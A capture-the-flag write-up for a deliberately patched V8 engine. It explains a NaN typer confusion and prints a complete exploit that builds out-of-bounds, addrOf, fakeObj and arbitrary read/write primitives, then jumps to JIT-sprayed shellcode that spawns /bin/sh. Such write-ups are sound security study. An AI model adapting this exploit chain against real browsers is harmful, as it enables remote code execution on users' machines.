# vroom vroom

Disclaimer:
I did not solve this challenge during the CTF.
While I was able to identify and trigger the vulnerability, I was not able to turn this vulnerability into an out-of-bounds access without hitting SIGTRAPs as I was using older V8 exploitation techniques.
linz04 and \_icecreamman on the DownUnderCTF Discord were very helpful in helping me understand the changes to the typer and how to bypass them, as well as sradley's solution script.
In this writeup, the JIT-sprayed shellcode and trigger for the vulnerability are those from sradley's solution (https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/pwn/return-to-monke/solve/exploit.js).

## Challenge

The Chromium "V8" JavaScript engine, with a patch that:
- changes the type of a 64-bit float result from a WASM function from a Number to a PlainNumber
- removes a Turbo typer hardening bounds check from the `Array.at` method

## Solution

Unlike a Number, a PlainNumber cannot be a NaN.
The patch will cause the typer to believe that the result of a WASM function that returns a float can never be NaN and will optimize the JITed function based on this assumption.
If we can convince the typer that an index will always be in-bounds of an array, we can bypass this bounds check.
We have to use the `Array.at` method for our out-of-bounds accesses, as the patch also removes an additional bounds check from this method.

Using this out-of-bounds access, we can create addrOf and fakeObj primitives.
We can also leak the map of an object.

Using these primitives and the leaked map, we can create a fake object with a controlled properties pointer.
By changing the value of this properties pointer, we can read and write to arbitrary addresses on the JSHeap.

Using this arbitrary read and write, we can change the entrypoint of a JITed function to point at our shellcode, which is smuggled in as floats.

By calling this function, we can execute our shellcode and spawn a shell.

## Exploit

```js
const buffer = new ArrayBuffer(8);
const floatarray = new Float64Array(buffer);
const biguint64array = new BigUint64Array(buffer);

function ftoi(x) {
	floatarray[0] = x;
	return biguint64array[0];
}

function itof(x) {
	biguint64array[0] = x;
	return floatarray[0];
}

// execve("/bin/sh", 0, 0);
// https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/pwn/vroom-vroom/solve/exp.js
function jit_shellcode() {
	return [
		1.9711828979523134e-246,
		1.9562205631094693e-246,
		1.9557819155246427e-246,
		1.9711824228871598e-246,
		1.971182639857203e-246,
		1.9711829003383248e-246,
		1.9895153920223886e-246,
		1.971182898881177e-246
	];
}

/*
double a(double x) {
	return x;
}
*/
wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,134,128,128,128,0,1,96,1,124,1,124,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,142,128,128,128,0,2,6,109,101,109,111,114,121,2,0,1,97,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,32,0,11]);
wasmModule = new WebAssembly.Module(wasmCode);
wasmInstance = new WebAssembly.Instance(wasmModule);
wasm = wasmInstance.exports.a;

function jit_leakMap(n) {
	let i = wasm(n);

	// https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/pwn/vroom-vroom/solve/exp.js
	i = Math.sign(i);   // Static type: Range(-1, 1), Actual: NaN
	i >>= 30;           // Static type: Range(-1, 0), Actual: -2
	i += 1;             // Static type: Range(0, 1),  Actual: -1
	i = -i;             // Static type: Range(-1, 0), Actual: 1
	i = Math.max(i, 0); // Static type: Range(0, 0),  Actual: 1

	const a = [1.1, 1.2];
	let b = {}; 
	b.a = 2.1;

	return [ftoi(a.at(i*4)), a, b];
}

function jit_addrOf(n, x) {
	let i = wasm(n);

	// https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/pwn/vroom-vroom/solve/exp.js
	i = Math.sign(i);   // Static type: Range(-1, 1), Actual: NaN
	i >>= 30;           // Static type: Range(-1, 0), Actual: -2
	i += 1;             // Static type: Range(0, 1),  Actual: -1
	i = -i;             // Static type: Range(-1, 0), Actual: 1
	i = Math.max(i, 0); // Static type: Range(0, 0),  Actual: 1

	const a = [1.1, 1.2];
	const b = [{}, x]; 

	return [(ftoi(a.at(i*9)) & 0xfffffffen), a, b];
}

function jit_fakeObj(n, x) {
	let i = wasm(n);

	// https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/pwn/vroom-vroom/solve/exp.js
	i = Math.sign(i);   // Static type: Range(-1, 1), Actual: NaN
	i >>= 30;           // Static type: Range(-1, 0), Actual: -2
	i += 1;             // Static type: Range(0, 1),  Actual: -1
	i = -i;             // Static type: Range(-1, 0), Actual: 1
	i = Math.max(i, 0); // Static type: Range(0, 0),  Actual: 1

	const a = [{}, {}];
	const b = [1.1, itof(x | 0x1n)]; 

	return [a.at(i*10), a, b];
}

for (let i=0; i < 1000000; i++) {
	jit_shellcode();
	jit_leakMap(NaN);
	jit_addrOf(NaN, {});
	jit_fakeObj(NaN, 1n);
}

function leakMap() {
	return jit_leakMap(NaN)[0];
}

function addrOf(x) {
	return jit_addrOf(NaN, x)[0];
}

function fakeObj(x) {
	return jit_fakeObj(NaN, x)[0];
}

map = leakMap();
console.log("map leak: ", map.toString(16));

test = {a:13.37};
test_addr = addrOf(test);
console.log("test addr: ", test_addr.toString(16));

test_fake = fakeObj(test_addr);
console.log("test fake === test: ", test_fake === test);

arr = [
	itof(map),
	1.1,
];

arr_addr = addrOf(arr);
console.log("arr addr: ", arr_addr.toString(16));

fake = fakeObj(arr_addr + 0x20n);

function arb_read(addr) {
	arr[1] = itof(((addr - 0x4n) | 0x1n) << 32n);
	return ftoi(fake.a);
}

function arb_write(addr, value) {
	arr[1] = itof(((addr - 0x4n) | 0x1n) << 32n);
	fake.a = itof(value);
}

console.log("read test: ", itof(arb_read(test_addr + 0x30n)));

arb_write(test_addr + 0x30n, 0x4094e40000000000n);
console.log("write test: ", test.a);

code = arb_read(addrOf(jit_shellcode) + 0x18n) & 0xfffffffen;
console.log("code addr: ", code.toString(16));

entry = arb_read(code + 0x10n);
console.log("entry: ", entry.toString(16));

arb_write(code + 0x10n, entry + 0x56n);

jit_shellcode();
```

## Flag

```
DUCTF{BuT_wHy_i5_v8_CaR_tH3mED_tH0Ugh_abf86c295245c2523c51384afd345741}
```
